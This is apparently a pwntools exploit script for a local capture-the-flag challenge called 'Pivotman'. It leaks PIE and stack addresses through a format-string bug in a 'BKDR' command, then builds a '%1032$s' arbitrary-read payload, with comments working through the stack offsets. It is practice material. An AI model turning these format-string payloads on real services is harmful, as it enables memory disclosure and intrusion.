#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)

p.recvuntil(b' \r\n', timeout=5)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Leak PIE
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):]
parts = after.split(b'.')
pie_leak = int(parts[0], 16)
stack_leak = int(parts[1], 16)
pie_base = pie_leak - 0x3a10
saved_rbp = stack_leak
log.info(f'PIE: {hex(pie_base)}, saved_rbp: {hex(saved_rbp)}')

# Now test: use %s to read from the beginning of the binary (ELF magic)
# The binary starts with "\x7fELF..."
addr = pie_base  # Should contain ELF magic at offset 0
log.info(f'Trying to read ELF magic at {hex(addr)}')

# The key issue: our payload has "%1032$sA" before the address at the end
# But the non-printable bytes of the address will be printed literally before the format string ends
# Actually wait - the format specifier comes BEFORE the address, so it's fine
# The format string: "%d BKDR %1032$sA" + garbage_address_bytes
# vsnprintf parses %1032$s at position 1 of the format string (before the address bytes)
# Let me recalculate...

# Position 1030 = buffer[0:8] = "%d BKDR "
# Position 1031 = buffer[8:16] = "%1032$sA"
# Position 1032 = buffer[16:24] = address

# My input starts at buffer[3]. Input = "BKDR " + "%1032$sA" + addr
# That's 5 + 8 + 8 = 21 bytes

# The format string is: "%d BKDR %1032$sA" + addr + " \r\n"
# Wait - but the null byte in the address terminates the format string!
# So vsnprintf only sees: "%d BKDR %1032$sA" + first 6 bytes of addr

# During vsnprintf processing:
# 1. %d -> print number
# 2. " BKDR " -> literal
# 3. %1032$s -> read string at position 1032
# 4. "A" -> literal  
# 5. remaining bytes of addr -> literal (until null byte)

# POSITION 1032 = bytes 16-23 of buffer = the full 8-byte address
# Even though the format string terminates at byte 22 (null), the positional reference
# %1032$s reads the 8-byte value at the stack position regardless

payload = b'BKDR ' + b'%1032$sA' + p64(addr)
log.info(f'Payload len: {len(payload)}, payload hex: {payload.hex()}')
p.sendline(payload)
try:
    resp = p.recvuntil(b' \r\n', timeout=3)
    log.info(f'Response: {resp}')
    # The output contains: number + " BKDR " + string_at_addr + "A" + garbage_addr_bytes
except:
    log.error('Crashed!')
    try:
        rest = p.recv(timeout=1)
        log.info(f'Remaining: {rest}')
    except:
        pass

# Also try: what if we just send a simple %s without embedding address?
# Use %s on a stack position that contains a valid pointer
# Position 2736 = saved_rbp (which is a stack address)
# So %2736$s should read from that stack address
# But wait, we need to make sure the format spec is before any null bytes

p.sendline(b'BKDR %2736$p')  # just verify we get the value
resp = p.recvuntil(b' \r\n')
log.info(f'Position 2736: {resp}')

p.close()
